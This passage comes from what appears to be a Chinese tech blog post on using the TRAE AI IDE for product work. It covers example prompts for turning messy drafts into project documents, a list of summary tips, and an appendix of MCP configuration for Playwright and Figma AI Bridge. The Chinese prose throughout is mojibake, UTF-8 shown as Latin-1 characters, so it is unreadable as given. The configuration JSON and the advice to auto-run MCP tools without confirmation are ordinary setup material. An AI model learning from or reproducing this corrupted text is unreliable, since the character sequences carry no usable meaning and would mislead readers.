<p><strong>æ— æ•ˆçº ç»“ï¼š</strong> å¤§é‡æ—¶é—´æµªè´¹åœ¨è°ƒæ•´æ ¼å¼ã€å¯¹é½å›¾å½¢ä¸Šï¼Œæ ¸å¿ƒé€»è¾‘åè€Œæ²¡æ—¶é—´æ‰“ç£¨ã€‚</p>
</li>
<li>
<p><strong>æ—¶é—´æˆæœ¬ï¼š</strong> 1 äººå¤©ã€‚</p>
</li>
</ul>
<p><strong>ç°åœ¨ (TRAE Flow)</strong></p>
<ul>
<li>
<p><strong>æš´åŠ›è¾“å‡ºè‰ç¨¿ï¼š</strong> æƒ³åˆ°ä»€ä¹ˆå†™ä»€ä¹ˆï¼Œç”šè‡³æŠŠå‚è€ƒèµ„æ–™ä¸€è‚¡è„‘ä¸¢è¿›ä¸€ä¸ªæ–‡æ¡£ï¼Œé€»è¾‘æ··ä¹±ä¹Ÿæ— æ‰€è°“ã€‚</p>
</li>
<li>
<p><strong>é™ç»´æ‰“å‡»ï¼š</strong> å°†è¿™å †â€œåŸæ–™â€ä¸¢ç»™ TRAEï¼Œç»“åˆæ˜ç¡®çš„æ•´ç†æ–¹æ³•è®ºï¼Œè®©å®ƒç¬é—´å®Œæˆç»“æ„åŒ–å’Œå¯è§†åŒ–ã€‚</p>
</li>
<li>
<p><strong>æ—¶é—´æˆæœ¬ï¼š</strong> 0.5 äººå¤©ï¼Œæ•ˆç‡æå‡ 2 å€ã€‚</p>
</li>
</ul>
<p><strong>æ ¸å¿ƒä»·å€¼ï¼šæ•ˆç‡æå‡ 2 å€</strong>ï¼Œå‘Šåˆ« PPT çººç»‡å·¥ï¼Œå›å½’æ€è€ƒè€…ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afd6b5c9e10a4537970fe1539eeee996~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=lKP89LPLV77%2FLNXGgwHr3lBIuDk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16"><strong>å®æˆ˜æ¡ˆä¾‹ï¼šç”¨ TRAE è¾…åŠ©ç¼–å†™é¡¹ç›®æ–‡æ¡£</strong></h3>
<p><strong>TRAE é…ç½®æ¸…å•</strong></p>
<ul>
<li>
<p><strong>æ¨¡å‹ï¼š</strong> gemini-3-pro-preview</p>
</li>
<li>
<p><strong>æ™ºèƒ½ä½“ï¼š</strong> Builder with MCP</p>
</li>
</ul>
<h4 data-id="heading-17"><strong>1ã€ç”¨äºé¡¹ç›®æ–‡æ¡£ä¸ç ”å‘å¯¹é½</strong></h4>
<p>å†™å®Œä¸Šé¢é‚£ä¸ªç”µå•† Agent çš„ MVP åï¼Œæˆ‘éœ€è¦ç»™ç ”å‘å’Œä¸šåŠ¡å›¢é˜ŸåŒæ­¥æ–¹æ¡ˆã€‚<strong>æˆ‘çš„è‰ç¨¿å¯èƒ½éå¸¸éšæ„ï¼Œæˆ‘ä¼šè®© TRAE æŒ‰ç…§æˆ‘çš„åŸåˆ™ï¼Œå¸®æˆ‘æ¢³ç†æˆä¸“ä¸šæ–‡æ¡£ã€‚</strong></p>
<p><strong>æš´åŠ›å†™ä¸‹ä½ çš„è‰ç¨¿ï¼ˆé€»è¾‘æ··ä¹±ä¹Ÿæ²¡å…³ç³»ï¼‰ï¼š</strong></p>
<blockquote>
<p>æˆ‘æƒ³è¦è·Ÿç ”å‘å›¢é˜ŸåŒæ­¥ï¼Œä»¥åŠä¸šåŠ¡å›¢é˜ŸåŒæ­¥æˆ‘çš„è¿™ä¸ªç”µå•†çš„ agent æ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„</p>
<p>å®ƒå…¶å®æ˜¯ç»™ C ç«¯ç”¨æˆ·ç”¨çš„ï¼Œèƒ½å¤Ÿè®©ç”¨æˆ·åœ¨å¯¹è¯çš„æƒ…å†µä¸‹å°±èƒ½å¤Ÿå®Œæˆä¸‹å•ã€‚ç›®å‰æ”¯æŒçš„åœºæ™¯å°±æ˜¯æœ‰æœç´¢å•†å“</p>
<p>ä»¥åå¯èƒ½è¿˜ä¼šæ”¯æŒä¸‹å•ï¼Œåšå”®åç­‰çš„åœºæ™¯</p>
<p>æ‰€ä»¥è¿™ä¸ªåé¢é™¤äº†è¦å¯¹æ¥å•†å“åº“ä»¥å¤–ï¼Œè¿˜è¦å¯¹æ¥å”®åçš„æ¥å£</p>
<p>ç„¶åè¿™ä¸ª agent ä¼šè‡ªå·±æ„å›¾è¯†åˆ«ç”¨æˆ·æƒ³è¦å¹²ä»€ä¹ˆï¼Œç„¶åå†å»è°ƒç”¨ä¸åŒçš„å·¥å…·ï¼Œæ¥å¸®ç”¨è§£å†³é—®é¢˜</p>
<p>balabalaï¼ˆè¿™é‡Œæˆ‘å°±ä¸ç»§ç»­å†™äº†ï¼‰</p>
</blockquote>
<p><strong>è®© TRAE æ•´ç†æˆä¸“ä¸šæ–‡æ¡£ï¼š</strong></p>
<blockquote>
<p>è¯·ä½ æ ¹æ®æˆ‘ä¸‹æ–¹ç»™ä½ çš„æˆ‘çš„è‰ç¨¿ï¼Œä»¥åŠæˆ‘å½“å‰çš„é¡¹ç›®çš„å®ç°ï¼Œå¸®æˆ‘å†™ä¸€é¢æ–¹ä¾¿æˆ‘è·Ÿå…¶ä»–åŒäº‹åŒæ­¥çš„ä¸€ä¸ª md æ–‡æ¡£</p>
<p>åœ¨è¿™ä¸ª md æ–‡æ¡£é‡Œé¢ï¼Œ æˆ‘å¸Œæœ›ä½ æ•´ä½“ä»¥æ€»åˆ†çš„ç»“æ„è¿›è¡Œç¼–å†™ï¼Œå…ˆé€šè¿‡æ€»ç»“è®©è¯»è€…è¯»æ‡‚æˆ‘ä»¬çš„è¿™ä¸ªæ–‡æ¡£è¦è¡¨è¾¾ä»€ä¹ˆå†…å®¹ã€‚å†åˆ†åˆ«å±•å¼€æ¯ä¸ªæ¨¡å—ã€‚å°½å¯èƒ½ç®€å•è¡¨è¾¾ï¼Œå°ç™½å°±èƒ½å¤Ÿä¸€çœ¼çœ‹æ‡‚ã€‚</p>
<p>ç„¶åå…³äº ai çš„å®ç°æ–¹é¢ï¼Œéœ€è¦ä½ è¾“å‡ºä¸€ä¸ªmermaid çš„æ¡†æ¶å›¾ï¼Œä¸æ—¶åºå›¾ï¼Œæ–¹ä¾¿æˆ‘ä¸å¼€å‘åŒæ­¥è¿™é‡Œé¢çš„å®ç°é€»è¾‘ï¼Œä»¥åŠæœªæ¥å¯èƒ½éœ€è¦å»å¯¹æ¥ä¸åŒçš„æ•°æ®åº“ï¼Œæˆ–è€… api èƒ½åŠ›èŒƒå›´æ˜¯ä»€ä¹ˆ</p>
<p>ä»¥ä¸‹æ˜¯æˆ‘çš„æ–‡æ¡£è‰ç¨¿ï¼š</p>
<p>æˆ‘æƒ³è¦è·Ÿç ”å‘å›¢é˜ŸåŒæ­¥ï¼Œä»¥åŠä¸šåŠ¡å›¢é˜ŸåŒæ­¥æˆ‘çš„è¿™ä¸ªç”µå•†çš„ agent æ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„</p>
<p>å®ƒå…¶å®æ˜¯ç»™ C ç«¯ç”¨æˆ·ç”¨çš„ï¼Œèƒ½å¤Ÿè®©ç”¨æˆ·åœ¨å¯¹è¯çš„æƒ…å†µä¸‹å°±èƒ½å¤Ÿå®Œæˆä¸‹å•ã€‚ç›®å‰æ”¯æŒçš„åœºæ™¯å°±æ˜¯æœ‰æœç´¢å•†å“</p>
<p>ä»¥åå¯èƒ½è¿˜ä¼šæ”¯æŒä¸‹å•ï¼Œåšå”®åç­‰çš„åœºæ™¯</p>
<p>æ‰€ä»¥è¿™ä¸ªåé¢é™¤äº†è¦å¯¹æ¥å•†å“åº“ä»¥å¤–ï¼Œè¿˜è¦å¯¹æ¥å”®åçš„æ¥å£</p>
<p>ç„¶åè¿™ä¸ª agent ä¼šè‡ªå·±æ„å›¾è¯†åˆ«ç”¨æˆ·æƒ³è¦å¹²ä»€ä¹ˆï¼Œç„¶åå†å»è°ƒç”¨ä¸åŒçš„å·¥å…·ï¼Œæ¥å¸®ç”¨è§£å†³é—®é¢˜</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6566edd4ca594688b747282fd47a594d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=IR1qoaF5%2B45ka0gQwikt31srsnI%3D" alt="" loading="lazy"/></p>
<p>TRAE ä¼šå°†ä½ çš„â€œæ„è¯†æµâ€è‰ç¨¿ï¼Œé‡æ„æˆä¸€ä»½ç»“æ„æ¸…æ™°ã€å›¾æ–‡å¹¶èŒ‚çš„æ­£å¼æ–‡æ¡£ã€‚</p>
<h4 data-id="heading-18"><strong>2ã€ç”¨äºç«å“åˆ†æä¸å¸‚åœºæ´å¯Ÿ</strong></h4>
<p><strong>è¿™ç§ã€Œéšæ€§æ‰“è‰ç¨¿ã€çš„æ–¹æ³•ï¼Œé™¤äº†ç”¨åœ¨é¡¹ç›®æ€»ç»“ï¼Œåœ¨åšç«å“è°ƒç ”çš„æ—¶å€™ä¹Ÿè¶…çº§å¥½ç”¨ã€‚</strong></p>
<p>ä»¥å‰åšè°ƒç ”ï¼Œå¯èƒ½è¿˜è¦æ‹…å¿ƒæ ¼å¼ä¹±ã€ä¿¡æ¯æ‚ã€‚ç°åœ¨å®Œå…¨ä¸éœ€è¦æŸæ‰‹æŸè„šï¼š</p>
<ul>
<li>
<p><strong>æš´åŠ›ç²˜è´´ï¼š</strong> çœ‹åˆ°è§‰å¾—æœ‰æ•ˆçš„ä¿¡æ¯ã€æ–‡ç« ç‰‡æ®µã€æ•°æ®ï¼Œç›´æ¥ä¸€è‚¡è„‘è´´åˆ°ä¸€ä¸ªæ–‡æ¡£é‡Œã€‚</p>
</li>
<li>
<p><strong>AI æ•´ç†ï¼š</strong> æŠŠè¿™å †â€œæ‚ä¹±ä¿¡æ¯â€ä¸¢ç»™ AIï¼Œè®©å®ƒå¸®ä½ ç»“æ„åŒ–æ•´ç†ï¼Œæå–æ ¸å¿ƒè§‚ç‚¹ã€‚</p>
</li>
<li>
<p><strong>å¯è§†åŒ–è¾“å‡ºï¼š</strong></p>
<p>è®© AI è¾“å‡ºä¸€å¼  <strong>Mermaid</strong> çš„æ¡†æ¶å›¾ï¼Œé€»è¾‘ç»“æ„ä¸€ç›®äº†ç„¶ã€‚</p>
<p>æˆ–è€…è®© AI ç»™ä½ ä¸€ä»½å¯ä»¥ç”¨äº <strong>Nanobanana</strong> çš„æç¤ºè¯ï¼Œç›´æ¥ç”Ÿæˆä¸€å¼ ç›´è§‚çš„å›¾ç‰‡ï¼Œæ”¾åœ¨æ–‡æ¡£é‡Œé€¼æ ¼æ»¡æ»¡ã€‚</p>
</li>
</ul>
<p>è¿™ç§å·¥ä½œæµï¼Œèƒ½ç¡®ä¿ä½ çš„æ‰€æœ‰ç²¾åŠ›éƒ½èŠ±åœ¨â€œæ”¶é›†é«˜ä»·å€¼ä¿¡æ¯â€è¿™ä¸€æ ¸å¿ƒç¯èŠ‚ä¸Šï¼Œè€Œå°†æ‰€æœ‰â€œæ•´ç†å’Œæ’ç‰ˆâ€çš„è„æ´»ç´¯æ´»éƒ½å¤–åŒ…ç»™ AIã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9be975a353664aaf95fc6561aaeed223~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=saabE6vYPdTkfeza4QFFvKXu%2FYk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-19"><strong>å†™åœ¨æœ€åï¼šäº§å“ç»ç†çš„ AI ç”Ÿå­˜æ³•åˆ™</strong></h2>
<p>å›é¡¾å…¨æ–‡ï¼Œæˆ‘ä»¬å‘ç° TRAE è¿™ç±» AI IDE å¸¦ç»™äº§å“ç»ç†çš„ï¼Œä¸ä»…æ˜¯æ•ˆç‡å·¥å…·ï¼Œæ›´æ˜¯ä¸€å¥—å…¨æ–°çš„å·¥ä½œèŒƒå¼ã€‚</p>
<p>ä¸ºäº†è®©ä½ èƒ½æ›´å¥½åœ°æ¶ˆåŒ–å’Œåº”ç”¨ï¼Œæˆ‘å°†å…¨æ–‡çš„æ ¸å¿ƒæŠ€å·§æ€»ç»“å¦‚ä¸‹ï¼š</p>
<h3 data-id="heading-20"><strong>æ ¸å¿ƒè®¤çŸ¥</strong></h3>
<ul>
<li>
<p><strong>TRAE Â æ˜¯ã€Œæƒ³æ³•ç¿»è¯‘å™¨ã€ï¼šä½ çš„é€»è¾‘è¡¨è¾¾è¶Šæ¸…æ™°ï¼ŒTRAE çš„è¿˜åŸåº¦å°±è¶Šé«˜ã€‚</strong></p>
</li>
<li>
<p><strong>æ‹¥æŠ±â€œå°æ­¥å¿«è·‘â€ï¼š</strong> ä»æ¡†æ¶ -&gt; ç»„ä»¶ -&gt; ç»†èŠ‚ï¼Œå¢é‡è¿­ä»£ï¼Œæ°¸è¿œæ¯”ä¸€å£åƒæˆèƒ–å­æ›´ç¨³ã€æ›´å¿«ã€‚</p>
</li>
<li>
<p><strong>ä»â€œç”»å›¾â€åˆ°â€œè¯´è¯â€ï¼š</strong> å·¥ä½œäº§å‡ºä»é™æ€çº¿æ¡†å›¾ï¼Œå‡çº§ä¸ºé«˜ä¿çœŸã€å¯äº¤äº’çš„ HTMLã€‚</p>
</li>
</ul>
<h3 data-id="heading-21"><strong>å®æˆ˜æŠ€å·§</strong></h3>
<ul>
<li>
<p><strong>é¡µé¢è¿˜åŸåŒæ³•å™¨ï¼š</strong></p>
<p><strong>æˆªå›¾æ³•ï¼š</strong> ç›´æ¥æˆªå›¾ + Playwright MCPï¼Œç®€å•ç²—æš´</p>
<p><strong>è®¾è®¡ç¨¿æ³•ï¼š</strong> Figma + AI Bridgeï¼Œè®¾è®¡å›¾ç›´æ¥å˜ä»£ç </p>
</li>
<li>
<p><strong>Playwright MCP ä¸‰å¦™ç”¨ï¼š</strong> æ£€æŸ¥å®ç°æ•ˆæœã€å¯¹æ¯”å‚è€ƒç½‘ç«™ã€æ¨¡æ‹Ÿç”¨æˆ·æµ‹è¯•æµç¨‹</p>
</li>
<li>
<p><strong>ç»†èŠ‚å¾®è°ƒå››æ¿æ–§ï¼š</strong> å¤åˆ¶ classname ç²¾å‡†å®šä½ã€ç»†è‡´è¡¨è¾¾éœ€æ±‚ã€æŒ‡å®šæŠ€æœ¯ç»´åº¦ã€æ›´æ¢æ¨¡å‹/é‡ç½®ä¸Šä¸‹æ–‡</p>
</li>
</ul>
<h3 data-id="heading-22"><strong>é¡¹ç›®è§„èŒƒ</strong></h3>
<ul>
<li>
<p><strong>Start è„šæœ¬ï¼š</strong> å›ºå®šç«¯å£å¯åŠ¨ï¼Œè‡ªåŠ¨æ¸…ç†å ç”¨ï¼Œç»ˆç«¯æ‰“å°è®¿é—®åœ°å€</p>
</li>
<li>
<p><strong>FRONTEND_SPEC.mdï¼š</strong> æ²‰æ·€å‰ç«¯è§„èŒƒï¼Œè®©åç»­è¿­ä»£æœ‰ç« å¯å¾ª</p>
</li>
<li>
<p><strong>ç”¨æˆ·è§†è§’æè¿°æ³•ï¼š</strong> ä»èµ·å§‹â†’æ“ä½œâ†’åé¦ˆâ†’ä½ç½®â†’å†…å®¹ï¼Œå®Œæ•´æè¿°äº¤äº’æµç¨‹</p>
</li>
</ul>
<h3 data-id="heading-23"><strong>è¿›é˜¶åº”ç”¨</strong></h3>
<ul>
<li>
<p><strong>0-1 é¡¹ç›®æ­å»ºï¼š</strong> è‡ªç”±åº¦æ›´é«˜ï¼Œä½†æ›´éœ€è¦è§„èŒƒçº¦æŸ</p>
</li>
<li>
<p><strong>å®ç°æ–‡æ¡£å…ˆè¡Œï¼š</strong> ä¸ç¡®å®šå®ç°æ–¹æ¡ˆæ—¶ï¼Œå…ˆè®© AI å†™å®ç°æ–‡æ¡£</p>
</li>
<li>
<p><strong>å¢é‡è¿­ä»£æ€ç»´ï¼š</strong> åŸºç¡€åŠŸèƒ½â†’äº¤äº’ä¼˜åŒ–â†’é«˜çº§åŠŸèƒ½ï¼Œå¾ªåºæ¸è¿›</p>
</li>
</ul>
<h3 data-id="heading-24"><strong>Prompt å¿ƒå¾—</strong></h3>
<ul>
<li>
<p><strong>è‡ªç”±éšæ€§ï¼š</strong> æ²¡æœ‰ä¸¥æ ¼çš„è¡¨è¾¾è§„èŒƒï¼Œé‡ç‚¹æ˜¯æŠŠéœ€æ±‚è¯´æ¸…æ¥š</p>
</li>
<li>
<p><strong>ä¿¡æ¯è¦ç»™è¶³ï¼š</strong> ç°çŠ¶ã€æœŸæœ›ã€å‚è€ƒä¿¡æ¯ï¼Œä¸€ä¸ªéƒ½ä¸èƒ½å°‘</p>
</li>
<li>
<p><strong>å¤šæ¨¡æ€è¡¨è¾¾ï¼š</strong> æ–‡å­—æè¿° + æˆªå›¾ + ç½‘é¡µå‚è€ƒï¼Œè®© TRAE ç†è§£æ›´ç²¾å‡†</p>
</li>
</ul>
<p><strong>æœ€åæƒ³è¯´çš„æ˜¯ï¼Œ</strong> TRAE è®©æˆ‘ä»¬çœŸæ­£æ‹¥æœ‰äº†å°†æƒ³æ³•ç›´æ¥è½åœ°çš„èƒ½åŠ›ã€‚å®ƒè®©æˆ‘ä»¬èƒ½å¤ŸæŠŠæ›´å¤šçš„æ—¶é—´èŠ±åœ¨æ€è€ƒäº§å“é€»è¾‘å’Œç”¨æˆ·ä½“éªŒä¸Šï¼Œè€Œä¸æ˜¯çº ç»“äºå…·ä½“çš„ä»£ç å®ç°ã€‚</p>
<p>å¸Œæœ›æˆ‘çš„è¿™äº›ç»éªŒåˆ†äº«ï¼Œèƒ½å¤Ÿå¸®åŠ©å¤§å®¶åœ¨æ—¥å¸¸å·¥ä½œä¸­æ›´å¥½åœ°ä½¿ç”¨ TRAEï¼Œæå‡å·¥ä½œæ•ˆç‡ã€‚å¦‚æœä½ ä¹Ÿæœ‰ç±»ä¼¼çš„ä½¿ç”¨å¿ƒå¾—ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµè®¨è®ºï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ffadcdbefa146ffac4f2d10a5723da8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=bHmvM6iWAv0lsgkWW2iYAre5Das%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-25"><strong>é™„å½•1ï¼šTRAE &amp; MCP é…ç½®æŒ‡å—</strong></h2>
<p>ä¸ºäº†æ–¹ä¾¿ä½ å¿«é€Ÿä¸Šæ‰‹ï¼Œæˆ‘æŠŠéœ€è¦ç”¨åˆ°çš„é…ç½®éƒ½æ•´ç†åœ¨è¿™é‡Œäº†ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´å°±è¡Œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27d7573ba6b94cd1b0eae6f27102c34b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=fO7qbdn83HxtLgZgee8usPW0sKU%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df8e4cf43188431485fc72adb5b8d987~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=Z6FRulZ%2F5Jd8kx0kDG3qclPYojE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-26"><strong>1. Playwright é…ç½®</strong></h3>
<p><strong>ç›¸å…³é“¾æ¥</strong></p>
<p><strong>GitHub ä»“åº“ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fplaywright-mcp" target="_blank" title="https://github.com/microsoft/playwright-mcp" ref="nofollow noopener noreferrer">microsoft/playwright-mcp</a></p>
<p><strong>Chrome æ’ä»¶ä¸‹è½½ï¼š</strong> [Releases é¡µé¢](<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fplaywright-mcp%2Freleases)" target="_blank" title="https://github.com/microsoft/playwright-mcp/releases)" ref="nofollow noopener noreferrer">github.com/microsoft/pâ€¦</a>Â </p>
<h4 data-id="heading-27"><strong>æ­¥éª¤ä¸€ï¼šé…ç½® MCP</strong></h4>
<pre><code class="hljs language-perl" lang="perl">{
<span class="hljs-string">"mcpServers"</span>: {
  <span class="hljs-string">"Playwright"</span>: {
    <span class="hljs-string">"command"</span>: <span class="hljs-string">"npx"</span>,
    <span class="hljs-string">"args"</span>: [
      <span class="hljs-string">"@playwright/mcp@latest"</span>,
      <span class="hljs-string">"--extension"</span>
    ]
  }
}
}
</code></pre>
<h4 data-id="heading-28"><strong>æ­¥éª¤äºŒï¼šå®‰è£…æµè§ˆå™¨æ’ä»¶</strong></h4>
<ul>
<li>
<p>ä»ä¸Šé¢çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fplaywright-mcp%2Freleases" target="_blank" title="https://github.com/microsoft/playwright-mcp/releases" ref="nofollow noopener noreferrer">Releases é¡µé¢</a> ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„æ’ä»¶å‹ç¼©åŒ…ã€‚</p>
</li>
<li>
<p>æ‰“å¼€ Chrome çš„æ‰©å±•ç¨‹åºç®¡ç†é¡µé¢ (<code>chrome://extensions/</code>)ã€‚</p>
</li>
<li>
<p>ç›´æ¥å°†ä¸‹è½½çš„å‹ç¼©åŒ…æ‹–æ‹½åˆ°é¡µé¢ä¸­ï¼Œå³å¯è‡ªåŠ¨å®‰è£…ã€‚</p>
</li>
<li>
<p>è®°å¾—æ‰‹åŠ¨å°†æ’ä»¶<strong>å›ºå®šåˆ°å·¥å…·æ </strong>ï¼Œæ–¹ä¾¿æŸ¥çœ‹è¿æ¥çŠ¶æ€ã€‚</p>
</li>
</ul>
<p><strong>å¦‚ä½•ä½¿ç”¨ï¼Ÿ</strong></p>
<blockquote>
<p>åœ¨å¯¹è¯ä¸­ï¼Œæ˜ç¡®æå‡ºè®© AI ä½¿ç”¨ <em><strong>playwrightmcp</strong></em> å³å¯è§¦å‘ã€‚</p>
</blockquote>
<p>ç¤ºä¾‹ï¼šâ€œè¯·ä½ ä½¿ç”¨ playwrightmcp æ‰“å¼€æˆ‘çš„é¡¹ç›®åœ°å€ or ç½‘é¡µ...â€</p>
<h3 data-id="heading-29"><strong>2. Figma AI Bridge é…ç½®</strong></h3>
<p>è¿™ä¸ªç¨å¾®å¤æ‚ç‚¹ï¼Œéœ€è¦å¡«å…¥ä½ çš„ Figma Tokenã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Figma AI Bridge"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"figma-developer-mcp"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"--stdio"</span>
      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"env"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"FIGMA_API_KEY"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ›¿æ¢ä¸ºä½ çš„ key"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"disabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-30"><strong>å¦‚ä½•è·å– Figma Keyï¼Ÿ</strong></h4>
<blockquote>
<p>ç™»å½• Figma ç½‘é¡µç‰ˆ -&gt; ç‚¹å‡»å¤´åƒ -&gt; Settings -&gt; Personal access tokens -&gt; Generate new tokenã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51f65498e5f343fc9fd92b18103bf4b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=zTLf1TuuldrdsuCtSEJxTXfBSaY%3D" alt="æˆªå±2026-02-09 16.00.02.png" loading="lazy"/></p>
<h4 data-id="heading-31"><strong>å¦‚ä½•ä½¿ç”¨ï¼Ÿ</strong></h4>
<blockquote>
<p>åœ¨å¯¹è¯ä¸­ï¼Œæ˜ç¡®æå‡ºè®© AI ä½¿ç”¨ <em><strong>fig</strong></em> <em><strong>ma ai bridge mcp</strong></em> å³å¯è§¦å‘ã€‚</p>
</blockquote>
<p><strong>ç¤ºä¾‹ï¼š</strong> â€œè¯·ä½ ä½¿ç”¨ figma ai bridge mcp æ¥æŸ¥çœ‹æˆ‘çš„è®¾è®¡å›¾ {{æ­¤å¤„å¡«å…¥ä½ çš„è®¾è®¡å›¾ url}}...å¹¶1:1 è¿˜åŸä¸ºå‰ç«¯çš„ html é¡µé¢â€</p>
<h4 data-id="heading-32"><strong>å¦‚ä½•è·å–è®¾è®¡å›¾ URLï¼Ÿ</strong></h4>
<p>é€‰ä¸­ä½ æƒ³è¿˜åŸçš„å®¹å™¨ï¼ˆæ•´ä¸ªé¡µé¢é€‰æœ€å¤–å±‚ï¼Œå•ä¸ªç»„ä»¶é€‰ç»„ä»¶å®¹å™¨ï¼‰ï¼Œå³é”® -&gt; Copy link -&gt; Copy link to selectionã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/380138f301e8437d8033673d6327bc1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=9NhNwfdpdk9oBZ63A7OM1Wev1ZY%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-33"><strong>é…å¥—ç¥å™¨ï¼šBuilder.io æ’ä»¶ (ç½‘é¡µè½¬è®¾è®¡å›¾)</strong></h4>
<p>åœ¨ Figma çš„ <strong>Actions</strong> (Cmd/Ctrl + P) ä¸­æœç´¢ <code>Builder.io</code> å¹¶è¿è¡Œã€‚</p>
<p>æ‰“å¼€æ’ä»¶åï¼Œåœ¨ <strong>Import</strong> èœå•å¤„é€‰æ‹© <code>Paste from Chrome</code>ã€‚</p>
<blockquote>
<p>è´´å…¥ä½¿ç”¨å®ƒé…å¥— Chrome æ’ä»¶å¤åˆ¶çš„å‰ç«¯ä»£ç  JSONï¼Œå°±èƒ½åœ¨ Figma ä¸­æ‹¿åˆ°å¯¹åº”çš„è®¾è®¡å›¾äº†ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5eb66780267d493b9ed5e1e790bfa2e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=IGvUoG8wOhs64Bww%2FD87HLyVf1U%3D" alt="æˆªå±2026-02-09 16.01.57.png" loading="lazy"/></p>
<h3 data-id="heading-34"><strong>3. å…¶ä»–å»ºè®®é…ç½®</strong></h3>
<p>ä¸ºäº†ä½“éªŒæ›´ä¸æ»‘ï¼Œå»ºè®®æ£€æŸ¥ä»¥ä¸‹è®¾ç½®ï¼š</p>
<p><strong>å¯¹è¯æµé…ç½®ï¼š</strong></p>
<p><strong>è‡ªåŠ¨è¿è¡Œ MCPï¼š</strong> å¼€å¯ (çœå¾—æ¯æ¬¡éƒ½è¦ç‚¹ç¡®è®¤)</p>
<p><strong>ä»¤è¿è¡Œæ–¹å¼ï¼š</strong> æ²™ç®±è¿è¡Œ (å®‰å…¨ç¬¬ä¸€)</p>
<p><strong>ä¸ªäººç™½åå•èŒƒå›´</strong> (å‚è€ƒ)ï¼š</p>
<p>python, cd,npm, chmod (æ ¹æ®é¡¹ç›®éœ€è¦çµæ´»è°ƒæ•´)</p>
